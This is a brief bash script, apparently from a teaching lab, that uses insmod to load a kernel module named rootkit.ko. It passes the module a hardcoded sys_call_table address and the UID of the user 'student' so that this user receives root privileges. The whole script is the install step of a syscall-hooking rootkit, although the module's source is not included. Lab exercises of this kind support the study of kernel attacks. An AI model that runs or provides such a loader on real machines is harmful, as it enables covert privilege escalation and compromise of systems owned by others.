#!/bin/bash

#Find the sys_call_table symbol's address from the /boot/System.map
TABLE_ADDR=ffffffff81801320

#Username of user to give root privileges to
USERNAME=student

#Sync for safety
sync

#Insert the rootkit module, providing some parameters
insmod rootkit.ko table_addr=0x$TABLE_ADDR root_uid="$(id --user "$USERNAME")"
